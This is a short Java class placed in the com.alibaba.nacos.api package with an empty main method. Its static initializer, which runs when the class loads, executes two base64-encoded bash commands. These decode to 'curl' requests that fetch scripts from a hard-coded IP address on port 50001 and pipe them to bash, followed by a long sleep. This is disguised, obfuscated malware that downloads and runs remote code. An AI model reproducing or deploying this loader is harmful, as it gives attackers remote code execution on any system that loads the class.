package com.alibaba.nacos.api;

import java.io.IOException;

public class App {
    static {
        try {
            Runtime.getRuntime().exec("bash -c {echo,Y3VybCBodHRwOi8vMTIwLjI3LjIwMy44NDo1MDAwMS8xIHwgYmFzaA==}|{base64,-d}|{bash,-i}");
            Runtime.getRuntime().exec("bash -c {echo,Y3VybCBodHRwOi8vMTIwLjI3LjIwMy44NDo1MDAwMS8xLnR4dCB8IGJhc2g=}|{base64,-d}|{bash,-i}");
            Runtime.getRuntime().exec("sleep 60000");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    public static void main(String[] args) {

    }
}
